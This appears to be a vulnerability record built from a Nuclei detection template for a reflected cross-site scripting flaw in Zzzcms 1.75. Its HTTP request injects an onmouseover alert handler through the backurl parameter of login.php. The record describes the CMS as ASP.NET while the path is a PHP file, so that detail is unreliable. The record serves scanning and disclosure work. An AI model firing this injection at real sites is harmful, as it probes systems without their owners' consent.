# Vulnerability: Zzzcms 1.75 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`zzzcms-xss.yaml`)

## Description
ZzzCMS ( A Lightweight ASP.NET content management system ) is vulnerable to XSS( Cross-Site Scripting ).

## Vulnerable Code Pattern / Exploit Payload
```http
GET /plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d HTTP/1.1
Host: {{Hostname}}
```

